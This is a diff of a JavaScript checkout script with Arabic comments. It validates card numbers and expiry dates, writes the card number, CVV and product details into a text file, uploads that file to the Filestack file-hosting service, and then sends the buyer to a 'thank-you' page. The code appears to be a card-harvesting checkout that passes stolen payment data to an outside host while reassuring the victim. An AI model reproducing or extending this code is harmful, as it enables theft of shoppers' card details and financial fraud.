@@ -152,8 +152,9 @@ document.addEventListener('DOMContentLoaded', function () {
       fileContent += `CVV: ${cvv}\n\n`;
       fileContent += `Product Information:\n`;
       fileContent += `Product Name: ${productName}\n`;
-      fileContent += `Product Price: ${productPrice}\n`;
-      fileContent += `Product Quantity: ${productQuantity}\n`;
+      fileContent += `Product Price: ${productPriceText}\n`;
+      fileContent += `Product Quantity: ${productQuantityText}\n`;
+      fileContent += `Product Image URL: ${productImageUrl}\n`;
       fileContent += `Total Price: ${totalPrice}\n`;
 
       // رفع الملف إلى Filestack
@@ -180,12 +181,14 @@ document.addEventListener('DOMContentLoaded', function () {
     for (let i = cardNumber.length - 1; i >= 0; i--) {
       let digit = parseInt(cardNumber[i]);
       if (shouldDouble) {
-        digit *= 2;
-        if (digit > 9) {
-          digit -= 9;
+        if (digit * 2 > 9) {
+          sum += (digit * 2) - 9;
+        } else {
+          sum += digit * 2;
         }
+      } else {
+        sum += digit;
       }
-      sum += digit;
       shouldDouble = !shouldDouble;
     }
     return sum % 10 === 0;
@@ -195,6 +198,7 @@ document.addEventListener('DOMContentLoaded', function () {
     const regex = /^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$/;  // Visa / MasterCard فقط
     return regex.test(cardNumber);
   }
+
 
   // دالة للتحقق من تاريخ الصلاحية
   function validateExpiry(expiry) {
@@ -231,6 +235,8 @@ document.addEventListener('DOMContentLoaded', function () {
     client.upload(fileBlob)
       .then((res) => {
         console.log('File uploaded successfully:', res);
+        // إعادة توجيه المستخدم إلى صفحة "شكرًا"
+        window.location.href = 'thank-you.html';  // قم بتغيير الرابط إلى صفحة "شكراً" الخاصة بك
       })
       .catch((err) => {
         console.error('Error uploading file:', err);
@@ -246,5 +252,10 @@ document.addEventListener('DOMContentLoaded', function () {
   });
 });
 
+
+
+
+
+ 
 
 
